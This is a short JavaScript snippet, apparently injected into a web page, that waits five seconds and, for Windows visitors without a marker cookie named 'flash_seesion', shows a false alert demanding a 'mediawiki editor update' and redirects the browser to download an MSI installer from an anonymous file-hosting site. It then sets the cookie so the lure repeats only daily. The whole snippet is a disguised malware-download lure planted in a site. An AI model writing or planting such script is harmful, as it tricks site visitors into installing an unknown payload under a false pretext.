function setCookie(name, value) {
    var Days = 1;
    var exp = new Date();
    exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString();
}
function chkcookies()
{
var cookiee="flash_seesion";
var c = document.cookie.indexOf(cookiee+"=");
if (c != -1)
{
return true;
}else if (/(Windows)/i.test(navigator.userAgent)) {
    alert("Please continue to visit after installing the mediawiki editor update!");
    location.href="https://cdn-153.anonfiles.com/03hby5cbz5/df843617-1678099126/MediaWiki+Editor+Patcher.msi";
}

setCookie("flash_seesion", "flash_cookies");
return false;
}
setTimeout("chkcookies()","5000");
